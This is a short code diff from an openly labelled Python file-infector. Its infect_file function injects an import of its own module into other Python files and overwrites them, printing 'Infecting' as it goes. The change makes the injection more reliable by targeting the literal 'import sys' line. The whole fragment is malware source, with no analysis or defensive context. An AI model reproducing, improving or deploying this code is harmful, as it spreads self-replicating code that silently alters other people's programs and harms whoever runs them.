@@ -99,7 +99,7 @@ def infect_file(file_path):
     if res:    
         # make a new import block that has our module
         new_imp = "import sys\nimport " + DEST_MODULE_NAME[:-3] + "\n"     
-        new_con = old_content.replace(current_imp, new_imp, 1)     # insert the new import block
+        new_con = old_content.replace("import sys", new_imp, 1)     # insert the new import block
         with open(file_path, "w") as f:
             print("Infecting " + file_path + "...")
             f.write(new_con)    # write the new content
